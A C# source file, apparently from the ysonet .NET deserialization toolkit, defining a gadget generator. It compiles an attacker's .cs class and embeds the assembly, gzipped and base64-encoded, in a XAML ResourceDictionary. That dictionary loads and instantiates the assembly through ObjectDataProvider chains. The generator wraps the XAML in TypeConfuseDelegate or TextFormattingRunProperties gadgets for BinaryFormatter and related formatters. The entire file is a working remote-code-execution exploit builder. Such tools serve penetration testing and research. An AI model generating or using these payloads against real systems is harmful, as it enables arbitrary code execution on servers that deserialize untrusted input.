using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class XamlAssemblyLoadFromFileGenerator : GenericGenerator
    {
        // Discovery facets (category search only): compiles the -c .cs file, then a
        // XAML ResourceDictionary does Assembly.Load + instantiate (code execution).
        // Uses WPF and framework built-in types. Variant 2
        // (TextFormattingRunProperties) also needs Microsoft.PowerShell.Editor,
        // declared as a variant override in Variants().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework);
        }

        public override string AdditionalInfo()
        {
            return "Loads assembly using XAML. This gadget interprets the command parameter as the path to the .cs file that should be compiled as an exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.Windows.Forms.dll'";
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.CsSourceFile;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                // Variant 1 wraps the XAML in TypeConfuseDelegate, whose gadget object
                // is a generic SortedSet<string>. SoapFormatter cannot serialize a
                // generic type, so this variant opts out of SoapFormatter (variant 2,
                // TextFormattingRunProperties, is not generic and serializes fine).
                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)").Without(Formatters.SoapFormatter),
                new GadgetVariant(2, "TextFormattingRunProperties wrapper")
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.CodeExecution)
                        .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf,
                            GadgetRequirement.NetFramework))
            };
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string Contributors()
        {
            return "russtone";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Variant };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        int variant_number = 1;

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
         {
            {"var|variant=", "Choices: 1 -> use TypeConfuseDelegateGenerator [default], 2 -> use TextFormattingRunPropertiesMarshal", v => int.TryParse(v, out variant_number) },
         };

            return options;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Reject an impossible variant+formatter pair (e.g. variant 1 + SoapFormatter)
            // before the expensive .cs compile below, with a clear message instead of a
            // deep framework exception.
            GuardVariantFormatter(variant_number, formatter);

            var files = inputArgs.Cmd;
            byte[] asmData = LocalCodeCompiler.GetAsmBytes(files);
            byte[] gzipAsmData = Gzip(asmData);
            string base64GzipAsmData = Convert.ToBase64String(gzipAsmData);


            var xmlResourceDict = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:s=""clr-namespace:System;assembly=mscorlib""
xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib""
xmlns:i=""clr-namespace:System.IO;assembly=mscorlib""
xmlns:c=""clr-namespace:System.IO.Compression;assembly=System""
>
   <s:Array x:Key=""data"" x:FactoryMethod=""s:Convert.FromBase64String"">
      <x:Arguments>
         <s:String>" + base64GzipAsmData + @"</s:String>
      </x:Arguments>
   </s:Array>
   <i:MemoryStream x:Key=""inputStream"">
      <x:Arguments>
         <StaticResource ResourceKey=""data""></StaticResource>
      </x:Arguments>
   </i:MemoryStream>
   <c:GZipStream x:Key=""gzipStream"">
      <x:Arguments>
            <StaticResource ResourceKey=""inputStream""></StaticResource>
            <c:CompressionMode>0</c:CompressionMode>
      </x:Arguments>
   </c:GZipStream>
   <s:Array x:Key=""buf"" x:FactoryMethod=""s:Array.CreateInstance"">
      <x:Arguments>
         <x:Type TypeName=""s:Byte""/>
         <x:Int32>" + asmData.Length + @"</x:Int32>
      </x:Arguments>
   </s:Array>
   <ObjectDataProvider x:Key=""tmp"" ObjectInstance=""{StaticResource gzipStream}"" MethodName=""Read"">
      <ObjectDataProvider.MethodParameters>
         <StaticResource ResourceKey=""buf""></StaticResource>
         <x:Int32>0</x:Int32>
         <x:Int32>" + asmData.Length + @"</x:Int32>
      </ObjectDataProvider.MethodParameters>
   </ObjectDataProvider>
    <ObjectDataProvider x:Key=""asmLoad"" ObjectType=""{x:Type r:Assembly}"" MethodName=""Load"">
        <ObjectDataProvider.MethodParameters>
            <StaticResource ResourceKey=""buf""></StaticResource>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""types"" ObjectInstance=""{StaticResource asmLoad}"" MethodName=""GetTypes"">
        <ObjectDataProvider.MethodParameters/>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""firstType"" ObjectInstance=""{StaticResource types}"" MethodName=""GetValue"">
        <ObjectDataProvider.MethodParameters>
            <s:Int32>0</s:Int32>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""createInstance"" ObjectInstance=""{StaticResource firstType}"" MethodName=""InvokeMember"">
        <ObjectDataProvider.MethodParameters>
            <x:Null/>
            <r:BindingFlags>512</r:BindingFlags>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
            <x:Null/>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            if (inputArgs.Minify)
            {
                xmlResourceDict = XmlMinifier.Minify(xmlResourceDict, null, null);
            }

            object obj;

            if (variant_number == 2)
            {
                obj = new TextFormattingRunPropertiesMarshal(xmlResourceDict);
            }
            else
            {
                // TypeConfuseDelegate wrapper: a generic SortedSet<string> (see
                // GetXamlGadget), so SoapFormatter is opted out for this variant above.
                obj = TypeConfuseDelegateGenerator.GetXamlGadget(xmlResourceDict);
            }

            return Serialize(obj, formatter, inputArgs);
        }

        // Shared with DataSetOldBehaviourFromFileGenerator's --compressed path.
        internal static byte[] Gzip(byte[] data)
        {
            var outputStream = new MemoryStream();
            var gzipStream = new GZipStream(outputStream, CompressionMode.Compress);
            gzipStream.Write(data, 0, data.Length);
            gzipStream.Close();
            var res = outputStream.ToArray();
            outputStream.Close();
            return res;
        }
    }
}
